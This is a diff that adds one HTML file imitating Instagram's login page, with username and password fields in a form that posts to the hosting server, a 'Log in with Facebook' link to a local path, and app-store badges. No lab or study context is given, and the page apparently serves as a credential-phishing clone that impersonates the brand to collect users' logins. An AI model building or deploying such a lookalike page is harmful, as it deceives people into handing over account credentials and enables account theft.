@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Instagram</title>
+  <style>
+    body {
+      background-color: black;
+      font-family: Arial, sans-serif;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-box {
+      background: #000;
+      padding: 20px 30px;
+      border-radius: 5px;
+      width: 320px;
+      text-align: center;
+      color: white;
+    }
+    .login-box h1 {
+      font-family: 'Billabong', cursive;
+      font-size: 48px;
+      margin-bottom: 20px;
+    }
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 3px;
+      background-color: #262626;
+      color: white;
+      box-sizing: border-box;
+    }
+    .login-box input::placeholder {
+      color: #bbb;
+    }
+    .login-box button {
+      background-color: #0095f6;
+      color: white;
+      border: none;
+      padding: 10px 0;
+      width: 100%;
+      border-radius: 3px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .login-box button:disabled {
+      background-color: #8acaf7;
+      cursor: not-allowed;
+    }
+    .login-box .separator {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+      color: #999;
+    }
+    .login-box .separator::before,
+    .login-box .separator::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #333;
+    }
+    .login-box .separator:not(:empty)::before {
+      margin-right: .75em;
+    }
+    .login-box .separator:not(:empty)::after {
+      margin-left: .75em;
+    }
+    .login-box a.facebook-login {
+      color: #385185;
+      font-weight: bold;
+      text-decoration: none;
+      display: block;
+      margin-bottom: 15px;
+    }
+    .login-box a.forgot-password {
+      color: white;
+      font-size: 12px;
+      text-decoration: none;
+      margin-bottom: 15px;
+      display: block;
+    }
+    .login-box .signup {
+      margin-top: 20px;
+      background-color: #262626;
+      padding: 15px;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+    .login-box .signup a {
+      color: #0095f6;
+      font-weight: bold;
+      text-decoration: none;
+    }
+    .login-box .app-links {
+      margin-top: 20px;
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+    }
+    .login-box .app-links img {
+      height: 40px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h1>Instagram</h1>
+    <form method="POST">
+      <input type="text" name="username" placeholder="Phone number, username, or email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Log in</button>
+    </form>
+    <div class="separator">OR</div>
+    <a href="/facebook_connect" class="facebook-login">Log in with Facebook</a>
+    <a href="#" class="forgot-password">Forgot password?</a>
+    <div class="signup">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+    <div class="app-links">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/48/Windows_Store_badge_EN.svg" alt="Microsoft Store" />
+    </div>
+  </div>
+</body>
+</html>
